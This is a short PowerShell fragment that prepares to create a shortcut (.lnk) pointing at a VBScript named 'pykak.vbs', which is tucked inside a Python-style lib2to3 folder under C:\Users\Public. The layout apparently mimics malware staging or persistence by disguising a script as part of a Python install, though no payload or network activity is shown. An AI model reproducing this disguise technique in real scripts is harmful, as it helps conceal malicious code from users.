...
# Create Shortcut for pykak.vbs in the specified directory
$TargetFile = "C:\Users\Public\Python\Python-main\Lib\lib2to3\pykak.vbs"
$ShortcutPath = "C:\Users\Public\Python\pykak.lnk"
